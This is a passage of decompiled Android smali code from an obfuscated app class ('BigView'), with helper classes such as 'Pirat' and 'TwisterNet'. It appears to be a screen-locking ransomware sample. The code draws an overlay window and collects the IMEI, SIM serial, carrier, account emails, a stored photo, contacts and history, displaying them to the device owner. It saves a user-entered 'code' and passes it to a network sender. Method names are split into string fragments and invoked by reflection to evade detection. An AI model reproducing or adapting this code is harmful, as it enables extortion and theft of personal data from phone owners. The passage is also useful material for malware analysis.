    .end local v59    # "continue2":Landroid/widget/Button;
    .end local v60    # "continue3":Landroid/widget/Button;
    :catch_0
    move-exception v61

    goto/16 :goto_0
.end method

.method protected unload()V
    .locals 2

    .prologue
    .line 240
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v0

    const-string v1, "window"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    invoke-interface {v0, p0}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    .line 242
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->removeAllViews()V

    .line 243
    return-void
.end method

.method public valid(Ljava/lang/String;)V
    .locals 10
    .param p1, "code"    # Ljava/lang/String;
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .prologue
    .line 435
    const-string v1, "ste"

    .line 436
    .local v1, "dfd":Ljava/lang/String;
    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "sy"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "ma"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    .line 437
    .local v6, "userDetails":Landroid/content/SharedPreferences;
    new-instance v5, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat;

    invoke-direct {v5, v6}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat;-><init>(Landroid/content/SharedPreferences;)V

    .line 438
    .local v5, "rtrtr":Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat;
    invoke-virtual {v5}, Lqfu/wfwhgkemerzo/eislrebmhmf/Pirat;->gett()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 439
    .local v3, "editor":Landroid/content/SharedPreferences$Editor;
    new-instance v4, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;

    invoke-direct {v4}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;-><init>()V

    .line 440
    .local v4, "putt":Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;
    const-string v7, "putString"

    const-string v8, "rezultstroka"

    invoke-virtual {v4, v3, v7, v8, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;->runus(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 441
    const-string v7, "putString"

    const-string v8, "status"

    const-string v9, "s1"

    invoke-virtual {v4, v3, v7, v8, v9}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKa;->runus(Landroid/content/SharedPreferences$Editor;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 445
    const-string v2, "ppl"

    .line 447
    .local v2, "dfdsfsd":Ljava/lang/String;
    :try_start_0
    const-string v7, "android.content.SharedPreferences$Editor"

    invoke-static {v7}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v7

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "a"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "y"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    const/4 v9, 0x0

    invoke-virtual {v7, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v7

    const/4 v8, 0x0

    invoke-virtual {v7, v3, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 452
    :goto_0
    new-instance v0, Lqfu/wfwhgkemerzo/eislrebmhmf/TwisterNet;

    invoke-virtual {p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v7

    const-string v8, "code"

    invoke-direct {v0, v7, v8, p1}, Lqfu/wfwhgkemerzo/eislrebmhmf/TwisterNet;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 453
    .local v0, "Send":Lqfu/wfwhgkemerzo/eislrebmhmf/TwisterNet;
    const-string v7, "page6"

    invoke-virtual {p0, v7}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->showpage(Ljava/lang/String;)V

    .line 454
    return-void

    .line 449
    .end local v0    # "Send":Lqfu/wfwhgkemerzo/eislrebmhmf/TwisterNet;
    :catch_0
    move-exception v7

    goto :goto_0
.end method

.method public vbivinfo()V
    .locals 42
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    .prologue
    .line 1055
    :try_start_0
    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v36

    const-string v37, "phone"

    invoke-virtual/range {v36 .. v37}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v33

    check-cast v33, Landroid/telephony/TelephonyManager;

    .line 1056
    .local v33, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual/range {v33 .. v33}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v26

    .line 1057
    .local v26, "operatorName":Ljava/lang/String;
    const v36, 0x7f08001f

    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v25

    check-cast v25, Landroid/widget/TextView;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 1058
    .local v25, "network":Landroid/widget/TextView;
    :try_start_1
    const-string v13, "tTe"

    .local v13, "dsfdfdd":Ljava/lang/String;
    const-string v36, "android.widget.TextView"

    invoke-static/range {v36 .. v36}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "se"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "xt"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    const-class v40, Ljava/lang/CharSequence;

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v36

    const/16 v37, 0x1

    move/from16 v0, v37

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v37, v0

    const/16 v38, 0x0

    aput-object v26, v37, v38

    move-object/from16 v0, v36

    move-object/from16 v1, v25

    move-object/from16 v2, v37

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_8
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 1060
    .end local v13    # "dsfdfdd":Ljava/lang/String;
    :goto_0
    :try_start_2
    invoke-virtual/range {v33 .. v33}, Landroid/telephony/TelephonyManager;->getSimSerialNumber()Ljava/lang/String;

    move-result-object v17

    .line 1061
    .local v17, "getSimSerialNumber":Ljava/lang/String;
    const v36, 0x7f080020

    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v29

    check-cast v29, Landroid/widget/TextView;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 1062
    .local v29, "phone":Landroid/widget/TextView;
    :try_start_3
    const-string v13, "tTe"

    .restart local v13    # "dsfdfdd":Ljava/lang/String;
    const-string v36, "android.widget.TextView"

    invoke-static/range {v36 .. v36}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "se"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "xt"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    const-class v40, Ljava/lang/CharSequence;

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v36

    const/16 v37, 0x1

    move/from16 v0, v37

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v37, v0

    const/16 v38, 0x0

    aput-object v17, v37, v38

    move-object/from16 v0, v36

    move-object/from16 v1, v29

    move-object/from16 v2, v37

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_3
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_7
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    .line 1064
    .end local v13    # "dsfdfdd":Ljava/lang/String;
    :goto_1
    const v36, 0x7f080021

    :try_start_4
    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v19

    check-cast v19, Landroid/widget/TextView;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 1065
    .local v19, "imei":Landroid/widget/TextView;
    :try_start_5
    const-string v13, "tTe"

    .restart local v13    # "dsfdfdd":Ljava/lang/String;
    const-string v36, "android.widget.TextView"

    invoke-static/range {v36 .. v36}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "se"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "xt"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    const-class v40, Ljava/lang/CharSequence;

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v36

    const/16 v37, 0x1

    move/from16 v0, v37

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v37, v0

    const/16 v38, 0x0

    invoke-virtual/range {v33 .. v33}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v39

    aput-object v39, v37, v38

    move-object/from16 v0, v36

    move-object/from16 v1, v19

    move-object/from16 v2, v37

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_5
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_6
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    .line 1067
    .end local v13    # "dsfdfdd":Ljava/lang/String;
    :goto_2
    const v36, 0x7f080022

    :try_start_6
    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v22

    check-cast v22, Landroid/widget/TextView;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0

    .line 1068
    .local v22, "model":Landroid/widget/TextView;
    :try_start_7
    const-string v13, "tTe"

    .restart local v13    # "dsfdfdd":Ljava/lang/String;
    const-string v36, "android.widget.TextView"

    invoke-static/range {v36 .. v36}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "se"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "xt"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    const-class v40, Ljava/lang/CharSequence;

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v36

    const/16 v37, 0x1

    move/from16 v0, v37

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v37, v0

    const/16 v38, 0x0

    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getDeviceName()Ljava/lang/String;

    move-result-object v39

    aput-object v39, v37, v38

    move-object/from16 v0, v36

    move-object/from16 v1, v22

    move-object/from16 v2, v37

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_7
    .catch Ljava/lang/Throwable; {:try_start_7 .. :try_end_7} :catch_5
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_0

    .line 1069
    .end local v13    # "dsfdfdd":Ljava/lang/String;
    :goto_3
    const/16 v34, 0x0

    .line 1071
    .local v34, "uriCustom":Landroid/net/Uri;
    :try_start_8
    const-string v14, "ar"

    .line 1072
    .local v14, "dsfdfdd33":Ljava/lang/String;
    const-string v36, "android.net.Uri"

    invoke-static/range {v36 .. v36}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "p"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "se"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    const-class v40, Ljava/lang/String;

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v36

    const-string v37, "android.net.Uri"

    invoke-static/range {v37 .. v37}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    new-instance v40, Ljava/lang/StringBuilder;

    invoke-direct/range {v40 .. v40}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->photoimg()Ljava/lang/String;

    move-result-object v41

    invoke-virtual/range {v40 .. v41}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v40

    invoke-virtual/range {v40 .. v40}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v40

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v36

    move-object/from16 v0, v36

    check-cast v0, Landroid/net/Uri;

    move-object/from16 v34, v0
    :try_end_8
    .catch Ljava/lang/Throwable; {:try_start_8 .. :try_end_8} :catch_4
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_0

    .line 1078
    .end local v14    # "dsfdfdd33":Ljava/lang/String;
    :goto_4
    const v36, 0x7f080027

    :try_start_9
    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v21

    check-cast v21, Landroid/widget/ImageView;

    .line 1079
    .local v21, "imgView":Landroid/widget/ImageView;
    new-instance v16, Ljava/io/File;

    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->photoimg()Ljava/lang/String;

    move-result-object v36

    move-object/from16 v0, v16

    move-object/from16 v1, v36

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1080
    .local v16, "f":Ljava/io/File;
    invoke-virtual/range {v16 .. v16}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v36

    invoke-static/range {v36 .. v36}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v9

    .line 1081
    .local v9, "bmp":Landroid/graphics/Bitmap;
    move-object/from16 v0, v21

    invoke-virtual {v0, v9}, Landroid/widget/ImageView;->setImageBitmap(Landroid/graphics/Bitmap;)V

    .line 1082
    const-string v36, "ffffg"

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "fff="

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual/range {v16 .. v16}, Ljava/io/File;->length()J

    move-result-wide v38

    invoke-virtual/range {v37 .. v39}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, " "

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v16 .. v16}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v38

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    invoke-static/range {v36 .. v37}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 1083
    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->photoimg()Ljava/lang/String;

    move-result-object v28

    .line 1084
    .local v28, "path":Ljava/lang/String;
    new-instance v20, Ljava/io/File;

    move-object/from16 v0, v20

    move-object/from16 v1, v28

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 1085
    .local v20, "imgFile":Ljava/io/File;
    invoke-virtual/range {v20 .. v20}, Ljava/io/File;->exists()Z

    move-result v36

    if-eqz v36, :cond_0

    .line 1087
    invoke-virtual/range {v20 .. v20}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v36

    invoke-static/range {v36 .. v36}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v23

    .line 1088
    .local v23, "myBitmap":Landroid/graphics/Bitmap;
    const v36, 0x7f080027

    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v24

    check-cast v24, Landroid/widget/ImageView;

    .line 1089
    .local v24, "myImage":Landroid/widget/ImageView;
    invoke-static/range {v23 .. v23}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->RotateBitmap(Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;

    move-result-object v23

    .line 1091
    move-object/from16 v0, v24

    move-object/from16 v1, v23

    invoke-virtual {v0, v1}, Landroid/widget/ImageView;->setImageBitmap(Landroid/graphics/Bitmap;)V

    .line 1097
    .end local v23    # "myBitmap":Landroid/graphics/Bitmap;
    .end local v24    # "myImage":Landroid/widget/ImageView;
    :goto_5
    const v36, 0x7f080023

    move-object/from16 v0, p0

    move/from16 v1, v36

    invoke-virtual {v0, v1}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->findViewById(I)Landroid/view/View;

    move-result-object v6

    check-cast v6, Landroid/widget/TextView;

    .line 1098
    .local v6, "accaunts":Landroid/widget/TextView;
    sget-object v15, Landroid/util/Patterns;->EMAIL_ADDRESS:Ljava/util/regex/Pattern;

    .line 1099
    .local v15, "emailPattern":Ljava/util/regex/Pattern;
    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v36

    invoke-static/range {v36 .. v36}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v36

    invoke-virtual/range {v36 .. v36}, Landroid/accounts/AccountManager;->getAccounts()[Landroid/accounts/Account;

    move-result-object v8

    .line 1100
    .local v8, "accounts":[Landroid/accounts/Account;
    const-string v27, ""

    .line 1101
    .local v27, "out":Ljava/lang/String;
    array-length v0, v8

    move/from16 v37, v0
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_0

    const/16 v36, 0x0

    :goto_6
    move/from16 v0, v36

    move/from16 v1, v37

    if-lt v0, v1, :cond_1

    .line 1108
    :try_start_a
    const-string v13, "tTe"

    .restart local v13    # "dsfdfdd":Ljava/lang/String;
    const-string v36, "android.widget.TextView"

    invoke-static/range {v36 .. v36}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "se"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "xt"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x1

    move/from16 v0, v38

    new-array v0, v0, [Ljava/lang/Class;

    move-object/from16 v38, v0

    const/16 v39, 0x0

    const-class v40, Ljava/lang/CharSequence;

    aput-object v40, v38, v39

    invoke-virtual/range {v36 .. v38}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v36

    const/16 v37, 0x1

    move/from16 v0, v37

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v37, v0

    const/16 v38, 0x0

    aput-object v27, v37, v38

    move-object/from16 v0, v36

    move-object/from16 v1, v37

    invoke-virtual {v0, v6, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_a
    .catch Ljava/lang/Throwable; {:try_start_a .. :try_end_a} :catch_3
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_0

    .line 1113
    .end local v6    # "accaunts":Landroid/widget/TextView;
    .end local v8    # "accounts":[Landroid/accounts/Account;
    .end local v9    # "bmp":Landroid/graphics/Bitmap;
    .end local v13    # "dsfdfdd":Ljava/lang/String;
    .end local v15    # "emailPattern":Ljava/util/regex/Pattern;
    .end local v16    # "f":Ljava/io/File;
    .end local v17    # "getSimSerialNumber":Ljava/lang/String;
    .end local v19    # "imei":Landroid/widget/TextView;
    .end local v20    # "imgFile":Ljava/io/File;
    .end local v21    # "imgView":Landroid/widget/ImageView;
    .end local v22    # "model":Landroid/widget/TextView;
    .end local v25    # "network":Landroid/widget/TextView;
    .end local v26    # "operatorName":Ljava/lang/String;
    .end local v27    # "out":Ljava/lang/String;
    .end local v28    # "path":Ljava/lang/String;
    .end local v29    # "phone":Landroid/widget/TextView;
    .end local v33    # "telephonyManager":Landroid/telephony/TelephonyManager;
    .end local v34    # "uriCustom":Landroid/net/Uri;
    :goto_7
    const-string v12, "ste"

    .line 1114
    .local v12, "dfd":Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lqfu/wfwhgkemerzo/eislrebmhmf/BigView;->getContext()Landroid/content/Context;

    move-result-object v36

    new-instance v37, Ljava/lang/StringBuilder;

    const-string v38, "sy"

    invoke-direct/range {v37 .. v38}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v37

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    const-string v38, "ma"

    invoke-virtual/range {v37 .. v38}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v37

    invoke-virtual/range {v37 .. v37}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v37

    const/16 v38, 0x0

    invoke-virtual/range {v36 .. v38}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v35

    .line 1118
    .local v35, "userDetails":Landroid/content/SharedPreferences;
    new-instance v32, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;

    invoke-direct/range {v32 .. v32}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;-><init>()V

    .line 1119
    .local v32, "putt2":Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;
    const-string v36, "getString"

    const-string v37, "contacts"

    const-string v38, ""

    move-object/from16 v0, v32

    move-object/from16 v1, v35

    move-object/from16 v2, v36

    move-object/from16 v3, v37

    move-object/from16 v4, v38

    invoke-virtual {v0, v1, v2, v3, v4}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 1120
    .local v11, "contacts":Ljava/lang/String;
    const-string v36, "getString"

    const-string v37, "history"

    const-string v38, ""

    move-object/from16 v0, v32

    move-object/from16 v1, v35

    move-object/from16 v2, v36

    move-object/from16 v3, v37

    move-object/from16 v4, v38

    invoke-virtual {v0, v1, v2, v3, v4}, Lqfu/wfwhgkemerzo/eislrebmhmf/PiratusKin;->runus(Landroid/content/SharedPreferences;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 1122
